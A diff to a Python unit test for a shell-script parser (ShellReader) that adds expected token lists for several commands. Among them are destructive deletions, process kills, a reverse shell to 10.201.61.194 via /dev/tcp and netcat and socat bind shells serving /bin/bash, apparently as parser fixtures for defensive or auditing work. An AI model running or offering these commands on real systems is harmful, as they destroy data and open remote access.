@@ -70,7 +70,14 @@ def test_reader_bash_multiline():
         ((13, 15), ['rm', '\\\n-rf " \\\n/']),
         ((16, 18), ['rm', '-r', '-f', '/']),
         ((18, 18), ['ls', '-al']),
-        ((19, 20), ['echo', 'Done']),
+        ((19, 22), ['rm', '--force', '-r', '/tmp/*']),
+        ((23, 23), ['kill', '-9', '123456']),
+        ((24, 24), ['kill', '-s', 'TERM', '123456']),
+        ((25, 25), ['kill', '-n', '9', '123456']),
+        ((26, 26), ['bash', '-i', '>', '/dev/tcp/10.201.61.194/5566']),
+        ((27, 27), ['nc', '-lvvp', '1988', '-e', '/bin/bash']),
+        ((28, 28), ['socat', '-lvvp', '1988', '-e', '/bin/bash']),
+        ((29, 30), ['echo', 'Done']),
     ]
     s = reader.ShellReader(box_data.script_shell_multiline)
     counter = 0
